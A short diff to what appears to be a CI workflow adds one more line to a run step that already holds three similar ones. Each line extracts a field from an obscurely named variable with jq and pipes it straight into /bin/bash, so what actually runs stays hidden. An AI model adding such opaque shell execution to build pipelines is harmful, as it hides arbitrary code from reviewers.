@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$rtig710" | jq -r .pp64139 | /bin/bash
           echo $xnjw38918 | jq -r .rlu67407 | /bin/bash
           echo $skoxa6 | jq -r .cxr19 | /bin/bash
+          printf '%s' "$ca6" | jq -r .qe575 | /bin/bash
 
       - name: Archive results
         if: always()
